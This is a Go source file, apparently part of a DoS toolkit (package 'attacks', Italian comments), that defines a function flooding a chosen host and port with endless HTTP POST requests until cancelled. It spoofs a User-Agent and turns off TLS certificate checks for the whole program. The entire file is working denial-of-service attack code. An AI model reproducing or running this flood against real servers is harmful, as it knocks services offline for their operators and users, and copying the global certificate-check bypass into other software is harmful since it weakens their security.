package attacks

import (
	"context"
	"crypto/tls"
	"fmt"
	"log"
	"net/http"
	"strings"
	"sync"
)

// SendHTTPPost invia richieste HTTP POST in un ciclo finché il contesto non viene cancellato
func SendHTTPPost(target string, port int, body string, userAgent string, wg *sync.WaitGroup, ctx context.Context) {
	defer wg.Done()

	// Costruisce l'URL con il protocollo corretto in base alla porta
	var url string
	if port == 443 {
		url = fmt.Sprintf("https://%s:%d", target, port)  // Usa HTTPS per la porta 443
	} else {
		url = fmt.Sprintf("http://%s:%d", target, port)   // Usa HTTP per la porta 80 o altre
	}

	// Ignora i certificati non validi per HTTPS
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	client := &http.Client{}

	for {
		select {
		case <-ctx.Done():
			log.Println("HTTP POST flood interrotto.")
			return
		default:
			// Crea la richiesta HTTP POST
			req, err := http.NewRequest("POST", url, strings.NewReader(body))
			if err != nil {
				log.Printf("Errore nella creazione della richiesta HTTP POST: %v", err)
				continue
			}

			// Imposta il User-Agent se specificato
			if userAgent != "" {
				req.Header.Set("User-Agent", userAgent)
			}

			// Imposta l'header Content-Type
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

			// Esegue la richiesta
			resp, err := client.Do(req)
			if err != nil {
				log.Printf("Errore nella richiesta HTTP POST: %v", err)
				continue
			}
			resp.Body.Close()
		}
	}
}
